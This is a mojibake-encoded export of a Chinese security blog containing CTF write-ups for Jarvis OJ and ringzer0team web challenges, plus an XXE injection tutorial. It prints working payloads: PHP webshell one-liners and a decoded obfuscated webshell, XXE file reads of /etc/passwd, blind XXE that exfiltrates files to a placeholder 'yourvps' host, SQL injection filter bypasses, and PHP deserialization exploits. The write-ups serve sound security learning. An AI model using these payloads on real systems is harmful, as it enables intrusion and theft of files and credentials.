ä¹‹åŽæ­¥éª¤å¦‚å‰ï¼Œå°†filenameæ”¹ä¸ºï¼š1|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125; å¾—åˆ°flagï¼š1CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125; apiè°ƒç”¨åœ¨ã€Šå°è¯•XMLå®žä½“æ³¨å…¥æ”»å‡»ã€‹ä¸­å·²ç»æè¿‡ã€‚ æŠ“åŒ…æ”¹åŒ…ï¼Œå°†Content-Typeæ”¹ä¸ºapplication/xmlï¼Œç„¶åŽpostæ•°æ®å¦‚ä¸‹ï¼š123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:////home/ctf/flag.txt&quot;&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; å¾—åˆ°flagï¼š1CTF&#123;XxE_15_n0T_S7range_Enough&#125; Easy Galleryéšæ‰‹æµ‹è¯•ä¸€ä¸‹åŠŸèƒ½ï¼Œæ¯”å¦‚ç‚¹å¼€submitï¼Œæˆ–è€…viewé¡µé¢ï¼Œä»–ä»¬çš„é“¾æŽ¥å¦‚ä¸‹ï¼š12http://web.jarvisoj.com:32785/index.php?page=submithttp://web.jarvisoj.com:32785/index.php?page=submit éšä¾¿æ”¹ä¸ªå‚æ•°ï¼š1http://web.jarvisoj.com:32785/index.php?page=view%27 ç»“æžœæŠ¥é”™ï¼š12Warning: fopen(view&apos;.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24No such file! æ‰€ä»¥è¿™é‡Œåº”è¯¥æœ‰æ–‡ä»¶åŒ…å«æ¼æ´žã€‚ç»“åˆsubmitçš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ï¼Œå¯ä»¥çŒœæƒ³æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œç„¶åŽå†åŽ»åŒ…å«å®ƒã€‚ç”¨edjpgcomåˆ¶ä½œå›¾ç‰‡ï¼Œæ’å…¥çš„ä¸€å¥è¯ä¸ºï¼š1&lt;script language=&quot;php&quot;&gt;@eval($_POST[&apos;c&apos;]);&lt;/script&gt; è‹¥æ˜¯ç›´æŽ¥ç”¨&lt;?php â€¦ ?&gt;ï¼Œä¼šå¤±è´¥ï¼Œåº”è¯¥æ˜¯æœåŠ¡å™¨ç«¯åšäº†è¿‡æ»¤ã€‚ä¸Šä¼ åŽå¾—åˆ°idã€‚ä¹‹åŽé€šè¿‡viewåŠŸèƒ½å¾—åˆ°å›¾ç‰‡çš„åœ°å€ä¸º1http://web.jarvisoj.com:32785/uploads/1499355842.jpg åˆ©ç”¨æ–‡ä»¶åŒ…å«åŠŸèƒ½ï¼ŒåŠ ä¸Š%00æˆªæ–­ç»•è¿‡ï¼Œè®¿é—®ï¼š12http://web.jarvisoj.com:32785/index.php?page=uploads/1499355842.jpg%00 å¾—åˆ°flagï¼š1CTF&#123;upl0ad_sh0uld_n07_b3_a110wed&#125; Chopperé¢˜ç›®åœ°å€ï¼šhttp://web.jarvisoj.com:32782/é¢˜ç›®æè¿°ï¼šå°æ˜Žå…¥ä¾µäº†ä¸€å°webæœåŠ¡å™¨å¹¶ä¸Šä¼ äº†ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯ï¼Œç®¡ç†å‘˜ä¿®è¡¥äº†æ¼æ´žï¼Œæ›´æ”¹äº†æƒé™ã€‚æ›´é‡è¦çš„æ˜¯ï¼šä»–å¿˜è®°äº†æœ¨é©¬çš„å¯†ç ï¼ä½ èƒ½å¸®åŠ©ä»–å¤ºå›žæŽ§åˆ¶æƒé™å—ï¼Ÿ æŸ¥çœ‹æºä»£ç ï¼Œå›¾ç‰‡çš„æ’å…¥æ–¹å¼æ¯”è¾ƒå¥‡æ€ªï¼Œå¦‚ä¸‹ï¼š1http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg ç‚¹å‡»ç®¡ç†å‘˜ç™»é™†1http://web.jarvisoj.com:32782/admin æŸ¥çœ‹æºä»£ç å¾—åˆ°æç¤ºï¼š1&lt;!--&lt;script&gt;alert(&apos;admin ip is 103.27.76.153&apos;)&lt;/script&gt;--&gt; ç»“åˆå‰é¢å›¾ç‰‡çš„æ’å…¥æ–¹å¼ï¼Œæˆ‘ä»¬æž„é€ ä¸‹é¢é“¾æŽ¥è®¿é—®ï¼š1http://web.jarvisoj.com:32782/proxy.php?url=http://103.27.76.153/proxy.php?url=http://web.jarvisoj.com:32782/admin/ é€šè¿‡æ‰«æå™¨çŸ¥adminç›®å½•ä¸‹æœ‰robots.txtï¼Œå†…å®¹å¦‚ä¸‹ï¼š123User-agent: *Disallow:trojan.phpDisallow:trojan.php.txt å…¶ä¸­trojan.php.txtçš„å†…å®¹æ˜¯ï¼š1&lt;?php $&#123;("#"^"|").("#"^"|")&#125;=("!"^"`").("( "^"&#123;").("("^"[").("~"^";").("|"^".").("*"^"~");$&#123;("#"^"|").("#"^"|")&#125;(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("&#125;"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&amp;"). ("#"^"p"). ("&gt;"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?&gt; ä¸Šè¿°ä»£ç ä¿å­˜ä¸ºphpé¡µé¢è¿è¡Œä¸€ä¸‹ï¼Œå¾—åˆ°Warningï¼š1Warning: assert() [function.assert]: Assertion &quot;eval($_POST[360])&quot; failed in C:\phpstudy\WWW\b.php on line 1 æ‰€ä»¥ï¼Œwebshellå¯†ç ä¸º360ã€‚ æœ€åŽflagï¼š1CTF&#123;fl4g_1s_my_c40d40_1s_n0t_y0urs&#125; IN A messé¢˜ç›®åœ°å€ï¼šhttp://web.jarvisoj.com:32780/index.php?id=1 è®¿é—®å¹¶æŸ¥çœ‹æºä»£ç ï¼Œå‘çŽ°æç¤ºï¼š1&lt;!--index.phps--&gt;work harder!harder!harder è®¿é—®index.phpsï¼Œå¾—åˆ°æºç ï¼š123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; phpå¼±ç±»åž‹ç»•è¿‡ã€‚å½“$aä¸ºphp://inputï¼Œ$dataå¯ä»¥é€šè¿‡php://inputæ¥æŽ¥å—postæ•°æ®ã€‚$idä¼ ä¸€ä¸ªå­—ç¬¦è¿›åŽ»ï¼Œä¼šè¢«è½¬æ¢ä¸º0ã€‚å¯¹$bï¼Œè¦æ±‚é•¿åº¦å¤§äºŽ5ï¼Œå…¶æ¬¡è¦æ±‚æ»¡è¶³eregiçš„è¦æ±‚å’Œé¦–å­—æ¯ä¸ä¸º4ã€‚å¯ä»¥è®¾ç½®$bä¸º%00111111ï¼Œè¿™æ ·ï¼Œsubstrï¼ˆï¼‰ä¼šå‘ç”Ÿæˆªæ–­ï¼Œåœ¨åŒ¹é…æ—¶æ—¶è¿›è¡Œeregi(â€œ111â€,â€1114â€)æ»¡è¶³ï¼ŒåŒæ—¶%00å¯¹strlenä¸ä¼šå‘ç”Ÿæˆªæ–­ã€‚ è®¿é—®ï¼š1http://web.jarvisoj.com:32780/^HT2mCpcvOLf å‘çŽ°é“¾æŽ¥è‡ªåŠ¨è¡¥å…¨ï¼Œå¦‚ä¸‹ï¼š1http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1 çŒœæµ‹æ˜¯æ³¨å…¥ã€‚æ³¨å…¥è¿‡ç¨‹å¦‚ä¸‹ï¼š1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,3# å­—æ®µæ•°ä¸º3ã€‚ 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,database()# å¾—åˆ°æ•°æ®åº“å:test 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374# å¾—åˆ°è¡¨åï¼šcontent 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74# å¾—åˆ°å­—æ®µåï¼šid,context,title 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,0x3a,context,0x3a,title,0x3a)/*123*/frfromom/*111*/content# å¾—åˆ°flagï¼š1PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125; ç¥žç›¾å±€çš„ç§˜å¯†æ‰“å¼€é¡µé¢åŽæŸ¥çœ‹æºä»£ç ï¼Œå‘çŽ°æ’å…¥å›¾ç‰‡çš„ä½ç½®å¤„æ˜¯base64åŠ å¯†ç»“æžœã€‚1&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt; å°†index.phpç»base64åŠ å¯†åŽå¾—åˆ°aW5kZXgucGhwå°è¯•è®¿é—®ï¼š1http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw å¾—åˆ°index.phpæºç ï¼š123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; çœ‹åˆ°é‡Œé¢æœ‰ä¸ªshield.phpï¼Œå°è¯•ç”¨å‰é¢çš„å¥—è·¯åŽ»è¯»å–ï¼š12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; ç”¨ä»¥ä¸‹è„šæœ¬ç”Ÿæˆåºåˆ—åŒ–ä¸²O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}ï¼š1234567&lt;?php class Shield &#123; public $file = &quot;pctf.php&quot;; &#125; $chybeta = new Shield(); print_r(serialize($chybeta));?&gt; è®¿é—®1http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°flagï¼š1PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125; é¡ºä¾¿é™„ä¸Šshowimg.phpçš„æºç ï¼š123456789101112&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt; Loginéšä¾¿å¡«ä¸€ä¸ªå¯†ç ã€‚æŠ“åŒ…å¾—åˆ°æç¤ºï¼š è¦æ³¨å…¥ä¸‹åˆ—sqlè¯­å¥ï¼š1&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot; å…³é”®åœ¨md5($pass,true)ï¼Œè‹¥$passçš„å€¼ä¸ºffifdyopï¼Œåˆ™ç»è¿‡md5è½¬æ¢åŽçš„å€¼å†ç»è¿‡phpè½¬ä¸ºå­—ç¬¦ä¸²åŽä¼šå˜æˆ&#39;or&#39;6è’¥æ¬“!r,î‹žbï¼Œ6çš„åŽé¢æ˜¯ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„å­—ç¬¦ï¼Œå§‘ä¸”è®°ä¸ºxxå§ã€‚åˆ™æœ€åŽçš„sqlæŸ¥è¯¢è¯­å¥ä¸ºï¼š1select * from `admin` where password=&apos;&apos;or&apos;6è’¥æ¬“!r,î‹žb&apos; æˆåŠŸé—­åˆå‰é¢çš„å•å¼•å·ã€‚å¡«å…¥passwordï¼Œå¾—åˆ°flagï¼š1PCTF&#123;R4w_md5_is_d4ng3rous&#125; æ›´å¤šå†…å®¹å¯è§ï¼šSQL injection with raw MD5 hashes LOCALHOSTç›´æŽ¥æ”¹X-Forwarded-Forä¸º127.0.0.1ã€‚å¾—åˆ°flag:1PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; PORT 51ç”¨vpsæ¥è¯·æ±‚ï¼Œä¸ç„¶ç»è¿‡è·¯ç”±åŽå¯èƒ½è¯·æ±‚ç«¯å£å°±å˜äº†ã€‚åœ¨vpsä¸Šï¼š123456789101112131415161718ubuntu@VM-207-93-ubuntu:~$ sudo curl --local-port 51 http://web.jarvisoj.com:32770/[sudo] password for ubuntu:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 100&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Yeah!! Here&apos;s your flag:PCTF&#123;M45t3r_oF_CuRl&#125;&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; flagï¼š1PCTF&#123;M45t3r_oF_CuRl&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[å°è¯•XMLå®žä½“æ³¨å…¥æ”»å‡»]]></title>
      <url>%2F2017%2F07%2F04%2F%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
      <content type="text"><![CDATA[XMLå®žä½“æ³¨å…¥æ”»å‡» åŸºç¡€çŸ¥è¯†XMLï¼ˆExtensible Markup Languageï¼‰è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚å…³äºŽå®ƒçš„è¯­æ³•ï¼Œæœ¬æ–‡ä¸å‡†å¤‡å†™å¤ªå¤šï¼Œåªç®€å•ä»‹ç»ä¸€ä¸‹ã€‚ XMLåŸºæœ¬çŸ¥è¯†12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;/to&gt;&lt;from&gt;ph0en1x&lt;/from&gt;&lt;/note&gt; åœ¨ä¸Šé¢ä»£ç ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå®šä¹‰XMLçš„ç‰ˆæœ¬ä¸Žç¼–ç ã€‚ åœ¨XMLæ–‡æ¡£ä¸­ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½å¿…é¡»æ­£ç¡®çš„åµŒå¥—ï¼Œå½¢æˆæ ‘å½¢ç»“æž„ã€‚å¹¶ä¸”æ•´ä¸ªXMLæ–‡æ¡£ä¸­å¿…é¡»è¦æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ã€‚å¦‚ä¸Šä»£ç ï¼Œ&lt;note&gt;æ˜¯æ•´ä¸ªæ–‡æ¡£çš„æ ¹å…ƒç´ ã€‚åµŒå¥—åœ¨noteæ ‡ç­¾ä¸­çš„&lt;to&gt;å’Œ&lt;from&gt;åˆ™æ˜¯æ ¹çš„å­å…ƒç´ ã€‚ åŒæ—¶ï¼Œæ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰å…³é—­æ ‡ç­¾ï¼Œè¿™ç‚¹ä¸åƒhtmlè¯­æ³•é‚£æ ·æ¾æ•£ã€‚å¦‚æžœç¼ºå¤±å…³é—­æ ‡ç­¾ï¼Œåˆ™ä¼šå¯¼è‡´XMLè§£æžå¤±è´¥ã€‚ å®žä½“æ‰€æœ‰çš„XMLæ–‡æ¡£éƒ½ç”±äº”ç§ç®€å•çš„æž„å»ºæ¨¡å—ï¼ˆå…ƒç´ ï¼Œå±žæ€§ï¼Œå®žä½“ï¼ŒPCDATA CDATAï¼‰æž„æˆã€‚è¿™é‡Œç€é‡ä»‹ç»ä¸€ä¸‹å®žä½“ï¼šå®žä½“æ˜¯ç”¨äºŽå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå®žä½“å¼•ç”¨æ˜¯å¯¹å®žä½“çš„å¼•ç”¨ã€‚å®žä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜Žã€‚å› æ­¤æˆ‘ä»¬åˆ©ç”¨å¼•å…¥å®žä½“ï¼Œæž„é€ æ¶æ„å†…å®¹ï¼Œä»Žè€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ å®žä½“ç±»åž‹XMLå®žä½“åˆ†ä¸ºå››ç§ï¼šå­—ç¬¦å®žä½“ï¼Œå‘½åå®žä½“ï¼Œå¤–éƒ¨å®žä½“ï¼Œå‚æ•°å®žä½“ã€‚ æ–‡æ¡£ç±»åž‹å®šä¹‰ï¼šDTDwikipediaå…³äºŽè¿™çš„æè¿°æ˜¯:The XML DTD syntax is one of several XML schema languagesã€‚ç®€å•çš„è¯´ï¼ŒDTDçš„ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æž„å»ºæ¨¡å—ã€‚å¦‚å‰æ‰€è¿°ï¼Œå®žä½“ä¹Ÿæ˜¯æž„å»ºæ¨¡å—ä¹‹ä¸€ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨DTDæ¥å†…éƒ¨æˆ–å¤–éƒ¨å¼•å…¥å®žä½“ã€‚ å…¶åŸºæœ¬æ ¼å¼ï¼š1&lt;!DOCTYPE æ ¹å…ƒç´ å [ å…ƒç´ æè¿° ]&gt; å†…éƒ¨å¼•å…¥æ ¼å¼ï¼š1&lt;!ENTITY å®žä½“åç§° "å®žä½“çš„å€¼"&gt; å°†DTDå’ŒXMLæ”¾åœ¨åŒä¸€ä»½æ–‡æ¡£ä¸­ï¼Œåˆ©ç”¨DTDå®šä¹‰çš„å®žä½“å³ä¸ºå†…éƒ¨å®žä½“ã€‚1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY chybeta "Hello World!"&gt; ]&gt; &lt;xxe&gt; &amp;chybeta;&lt;/xxe&gt; è®¿é—®è¯¥XMLæ–‡æ¡£ï¼Œ&amp;chybeta;ä¼šè¢«è§£æžä¸ºHello World!å¹¶è¾“å‡ºã€‚ å¤–éƒ¨å¼•å…¥åŸºæœ¬æ ¼å¼ï¼š1&lt;!ENTITY å®žä½“åç§° SYSTEM "URI"&gt; é€šè¿‡å¼•ç”¨å®šä¹‰åœ¨å¤–éƒ¨çš„DTDä¸­çš„å®žä½“ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºå¤–éƒ¨å®žä½“ã€‚ç”±äºŽxxeæ¼æ´žä¸»è¦åˆ©ç”¨çš„æ˜¯å¤–éƒ¨å®žä½“ï¼Œæ‰€ä»¥è¿™é‡Œæš‚ä¸å±•å¼€ã€‚å…·ä½“å®žä¾‹è§ä¸‹ã€‚ åˆ©ç”¨æ–¹å¼xxeæ³¨å…¥ä»¥phpçŽ¯å¢ƒä¸ºä¾‹ï¼Œindex.phpå†…å®¹å¦‚ä¸‹ï¼š1234&lt;?php $xml=simplexml_load_string($_GET['xml']); print_r((string)$xml);?&gt; è¯»å–æœ¬åœ°æ–‡ä»¶ åˆ©ç”¨å„ç§åè®®å¯ä»¥è¯»å–æ–‡ä»¶ã€‚æ¯”å¦‚fileåè®®ï¼Œè¿™é‡Œçš„æµ‹è¯•çŽ¯å¢ƒä¸ºwinï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘é€‰æ‹©è¯»å–cç›˜é‡Œçš„TEST.txtã€‚123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///c://TEST.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; å°†ä¸Šè¿°xmlè¿›è¡Œurlç¼–ç åŽä¼ è¿›åŽ»ï¼Œå¯ä»¥å‘çŽ°è¯»å–äº†TEST.txtä¸­çš„å†…å®¹ã€‚ æˆ‘è¿™é‡Œæµ‹è¯•æ—¶ï¼Œå¦‚æžœä¸è¿›è¡Œurlç¼–ç åˆ™ä¸èƒ½æˆåŠŸè§£æžã€‚ è‹¥ä½¿ç”¨fillåè®®ï¼Œåœ¨unixçŽ¯å¢ƒä¸‹ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹xmlæ¥è¯»å–passwdï¼š123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; å¦‚æžœè¦è¯»å–phpæ–‡ä»¶ï¼Œå› ä¸ºphpã€htmlç­‰æ–‡ä»¶ä¸­æœ‰å„ç§æ‹¬å·&lt;ï¼Œ&gt;ï¼Œè‹¥ç›´æŽ¥ç”¨fileè¯»å–ä¼šå¯¼è‡´è§£æžé”™è¯¯ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨php://filterå°†å†…å®¹è½¬æ¢ä¸ºbase64åŽå†è¯»å–ã€‚ 123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; è¿™é‡ŒåŒæ ·å…ˆç»è¿‡urlç¼–ç åŽå†ä¼ å…¥ã€‚è¯»å–ç»“æžœå¦‚ä¸‹: å‘½ä»¤æ‰§è¡ŒphpçŽ¯å¢ƒä¸‹ï¼Œxmlå‘½ä»¤æ‰§è¡Œè¦æ±‚phpè£…æœ‰expectæ‰©å±•ã€‚è€Œè¯¥æ‰©å±•é»˜è®¤æ²¡æœ‰å®‰è£…ã€‚è¿™é‡Œæš‚ä¸è¿›è¡Œæµ‹è¯•ã€‚ å†…ç½‘æŽ¢æµ‹/SSRFç”±äºŽxmlå®žä½“æ³¨å…¥æ”»å‡»å¯ä»¥åˆ©ç”¨http://åè®®ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å‘èµ·httpè¯·æ±‚ã€‚å¯ä»¥åˆ©ç”¨è¯¥è¯·æ±‚åŽ»æŽ¢æŸ¥å†…ç½‘ï¼Œè¿›è¡ŒSSRFæ”»å‡»ã€‚ bind xxeä»¥phpçŽ¯å¢ƒä¸ºä¾‹ï¼ŒçŽ°åœ¨æ›´æ”¹index.phpå†…å®¹å¦‚ä¸‹ï¼š123&lt;?php $xml=simplexml_load_string($_GET['xml']);?&gt; å°‘äº†print_rï¼Œå³æ²¡æœ‰å›žæ˜¾æ¶ˆæ¯ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‚æ•°å®žä½“ï¼Œé€šè¿‡å‘èµ·httpè¯·æ±‚æ¥æ”»å‡»ã€‚ è¯»å–æœ¬åœ°æ–‡ä»¶payload11234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "file:///c://TEST.txt"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; åœ¨æˆ‘çš„vpsçš„xxe.xmlçš„å†…å®¹å¦‚ä¸‹ï¼š1&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt; è€Œæµ‹è¯•æ–‡ä»¶TEST.txtå†…å®¹ä¸ºï¼š1chybeta æ•´ä¸ªçš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼šè§£æžæ—¶%dtdå¼•å…¥xxe.xmlï¼Œä¹‹åŽ%allå¼•å…¥sendçš„å®šä¹‰ï¼Œæœ€åŽå¼•ç”¨äº†å®žä½“sendï¼ŒæŠŠ%fileæ–‡ä»¶å†…å®¹é€šè¿‡ä¸€ä¸ªhttpè¯·æ±‚å‘äº†å‡ºåŽ»ã€‚æ³¨æ„éœ€è¦æŠŠpayloadç»è¿‡urlç¼–ç ã€‚æŸ¥çœ‹vpsä¸Šçš„access.logï¼š è‹¥è¦è¯»å–phpç­‰æ–‡ä»¶ï¼ŒåŒæ ·éœ€è¦å…ˆç»è¿‡base64åŠ å¯†ä¸‹ã€‚1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; æŸ¥çœ‹access.log: payload2å‘é€çš„xmlï¼š123456&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %send;]&gt; è€Œåœ¨vpsä¸Šçš„xxe.xmlå†…å®¹ä¸ºï¼š1&lt;!ENTITY % payload2 "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://yourvps/%file;'&gt;"&gt; %payload2; æ³¨æ„çš„æ˜¯ï¼Œ&amp;#25; ä¸èƒ½ç›´æŽ¥å†™æˆ%ï¼Œå¦åˆ™æ— æ³•è§£æžã€‚ xxe.xmlä¸­å®šä¹‰å’Œå¼•ç”¨äº†%payload2,åœ¨é€šè¿‡%dtdå¼•å…¥xxe.xmlåŽï¼Œå¾—ä»¥ä½¿ç”¨ç¬¦å·å®žä½“%sendæ¥è¿›è¡Œå‘é€ã€‚å…¶ä¸­%fileä¸ºè¯»å–çš„æ–‡ä»¶å†…å®¹ã€‚æŸ¥çœ‹access.log: ctfå°è¯•ç‰›åˆ€æ‹¿jarvisojå¹³å°ä¸Šçš„é¢˜ç›®æ¥å°è¯•ç‰›åˆ€å§ã€‚ é¢˜ç›®ï¼šapiè°ƒç”¨ é¢˜ç›®æè¿°ï¼šè¯·è®¾æ³•èŽ·å¾—ç›®æ ‡æœºå™¨/home/ctf/flag.txtä¸­çš„flagå€¼ xxeç›¸å…³WP AliCTF-Quals-2014 WebA-300 HCTF-2016 å¤§å›¾ä¹¦ç®¡çš„ç‰§ç¾Šäºº&amp;&amp;é­”æ³•ç¦ä¹¦ç›®å½• GoSecure-CTF-2015 web-300]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-web-writeup]]></title>
      <url>%2F2017%2F06%2F30%2F%C2%96ringzer0team-web-writeup%2F</url>
      <content type="text"><![CDATA[ringzer0team-web Big Brother is watchingé¢˜ç›®åœ°å€ï¼š https://ringzer0team.com/challenges/212 é¢˜ç›®æç¤ºï¼šEven Google cannot find this onegoogleæ˜¯æœç´¢å¼•æ“Žï¼Œèƒ½é˜»æ­¢å®ƒçš„è‡ªç„¶æ˜¯ã€‚ã€‚ã€‚robots.txtå•¦è®¿é—®https://ringzer0team.com/robots.txt12User-agent: *Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/ è®¿é—® https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/ å¾—åˆ°flagï¼›1FLAG-G5swO95w0c7R5fq0sa85nVs5dK49O04i Looking for password fileé¢˜ç›®åœ°å€ï¼šhttp://ringzer0team.com:1008/?page=lorem.php è¯»å–passwordï¼ŒçŒœæµ‹æ˜¯passwdæ–‡ä»¶ã€‚è®¿é—®ï¼šhttp://ringzer0team.com:1008/?page=/etc/passwd å¾—åˆ°flag:1FLAG-zH9g1934v774Y7Zx5s16t5ym8Z Area 51é¢˜ç›®åœ°å€ï¼šhttps://ringzer0team.com/challenges/48 é¢˜ç›®æç¤ºï¼šAccess to this area is restricted using some secure .htaccess .htaccessä¸­å¯ä»¥é™åˆ¶å„ç§è¯·æ±‚ã€‚é€šè¿‡å°è¯•åŽï¼ŒæŠ“åŒ…ï¼Œæ”¹è¯·æ±‚æ–¹å¼GETä¸ºPUTã€‚å¾—åˆ°flagï¼š1FLAG-w4KRr557y626izv567758O52 Headacheé¢˜ç›®æç¤ºï¼šAnswer is closer than you think! headï¼Œæ‰€ä»¥æˆ‘ä»¬æŠ“åŒ…çœ‹å¤´éƒ¨ã€‚å¾—åˆ°flagï¼š1FLAG-365m4fU5p2DVEQbfrptDE5Ru] Words mean 